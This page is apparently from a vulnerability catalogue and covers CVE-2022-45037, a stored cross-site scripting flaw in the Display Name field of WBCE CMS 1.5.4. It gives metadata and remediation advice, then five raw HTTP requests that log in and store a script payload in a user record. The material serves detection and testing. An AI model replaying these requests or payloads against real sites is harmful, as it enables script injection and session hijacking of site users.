---
layout: post
cve_id: CVE-2022-45037
title: WBCE CMS v1.5.4 - Cross Site Scripting (Stored)
pcap: true
pcap_path: /pcaps/2022/CVE-2022-45037.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-45037.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  inject malicious scripts into web pages viewed by users, leading to potential data
  theft, session hijacking, or defacement of the affected website.

  '
remediation: 'Upgrade to the latest version of WBCE CMS or apply the necessary patches
  provided by the vendor to fix the Cross Site Scripting vulnerability.

  '
reference:
- https://github.com/WBCE/WBCE_CMS
- https://shimo.im/docs/dPkpKPQEjXfvYoqO/read
- https://nvd.nist.gov/vuln/detail/CVE-2022-45037
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 5.4
  cve-id: CVE-2022-45037
  cwe-id: CWE-79
  epss-score: 0.21323
  epss-percentile: 0.95503
  cpe: cpe:2.3:a:wbce:wbce_cms:1.5.4:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 5
  vendor: wbce
  product: wbce_cms
tags:
- cve
- cve2022
- xss
- wbce
- cms
- authenticated
- vuln
---

## üîç Vulnerability Description
A cross-site scripting (XSS) vulnerability in /admin/users/index.php of WBCE CMS v1.5.4 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Display Name field.


## üåê HTTP Request
```nohighlight
GET /admin/login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /admin/login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 97
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
url=&username_fieldname=4Uv3Op&password_fieldname=TDxk4y&4Uv3Op=Bg4Hjw&TDxk4y=s3BItk&submit=Login
```

```nohighlight
GET /admin/users/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /admin/users/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0
Connection: close
Content-Length: 303
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
formtoken=4zEGp6&user_id=&username_fieldname=Z4B6Lr&Z4B6Lr=test-38FDnDqMyE237AFqAuFTla4Gm52&password=38FDnDqMyE237AFqAuFTla4Gm52&password2=&display_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&email=38FDnDqMyE237AFqAuFTla4Gm52%40gmail.com&home_folder=&groups%5B%5D=1&active%5B%5D=1&submit=
```

```nohighlight
GET /admin/users/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

